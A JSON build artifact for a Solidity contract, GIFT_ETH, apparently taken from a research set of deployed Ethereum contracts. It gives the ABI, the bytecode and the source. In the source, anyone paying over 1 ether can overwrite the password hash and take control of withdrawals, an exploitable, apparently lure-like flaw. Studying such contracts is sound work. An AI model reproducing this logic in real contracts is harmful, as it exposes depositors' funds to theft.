{
  "contractName": "GIFT_ETH",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_reciver",
          "type": "address"
        }
      ],
      "name": "SetReciver",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b5061055d8061003b6000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb051461007a578063181ffc5f1461009e57806331fd725a146100cc578063410c8005146100fd578063b456ecc514610140578063bea948c8146101c5575b005b61009c60048036038101908080356000191690602001909291905050506101cf565b005b6100ca60048036038101908080359060200190820180359060200191909192939192939050505061025b565b005b3480156100d857600080fd5b506100fb60048036038101908080356000191690602001909291905050506102ec565b005b34801561010957600080fd5b5061013e600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610374565b005b34801561014c57600080fd5b506101a7600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061040e565b60405180826000191660001916815260200191505060405180910390f35b6101cd61047a565b005b600160009054906101000a900460ff161580156101f35750670de0b6b3a764000034115b806102075750600060010260005460001916145b15610258578060008160001916905550336001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b8181604051808383808284378201915050925050506040518091039020600019166000546000191614156102e8573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102e6573d6000803e3d6000fd5b505b5050565b60005460001916816000191614801561035157506001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b156103715760018060006101000a81548160ff0219169083151502179055505b50565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561040b5780600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6000816040518082805190602001908083835b6020831015156104465780518252602082019150602081019050602083039250610421565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561052f573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561052d573d6000803e3d6000fd5b505b5600a165627a7a723058203382a0fe2a5ebc44e02b7b7cb15f21cb44113ae59559ce6c338772f818caa4810029",
  "source": "\n\ncontract GIFT_ETH\n{\n    function GetGift(bytes pass)\n    external\n    payable\n    {\n        if(hashPass == keccak256(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function GetGift()\n    public\n    payable\n    {\n        if(msg.sender==reciver)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    bytes32 hashPass;\n    \n    bool closed = false;\n    \n    address sender;\n    \n    address reciver;\n \n    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)\n        {\n            hashPass = hash;\n            sender = msg.sender;\n\n        }\n    }\n   \n    function SetReciver(address _reciver)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            reciver = _reciver;\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(hash==hashPass&&msg.sender==sender)\n        {\n           closed=true;\n        }\n    }\n    \n    function() public payable{}\n    \n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x7fefc8bf6e44784ed016d08557e209169095f0f3/contracts/0x7fefc8bf6e44784ed016d08557e209169095f0f3.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:58:37.605Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}